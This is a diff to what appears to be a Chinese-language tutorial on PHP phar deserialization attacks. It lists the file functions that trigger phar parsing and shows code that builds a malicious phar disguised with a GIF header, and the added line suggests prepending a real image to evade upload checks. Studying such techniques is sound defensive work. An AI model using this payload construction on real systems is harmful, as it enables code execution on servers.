@@ -16,8 +16,6 @@ include、require、include_once、require_once、highlight_file 、
 show_source 、readfile 、file_get_contents 、fopen 、file、
 file_exists
 
-
-
 phar文件可以改名为任意后缀，只要能被伪协议读取即可。
 
 2、要有可利用的魔术方法
@@ -111,6 +109,8 @@ $phar = new Phar("phar.phar");
 $phar->startBuffering();
 //$phar->setStub("__HALT_COMPILER(); ?>");
 $phar->setStub("GIF89a"."<?php __HALT_COMPILER(); ?>");  //设置stub，增加gif文件头
+//$phar->setStub(file_get_contents('a.png')."<?php __HALT_COMPILER(); ?>"); //防止检测也可以直接加一个小图片在前面
+
 $phar->setMetadata($a);
 $phar->addFromString("test.txt", "test");
 $phar->stopBuffering();
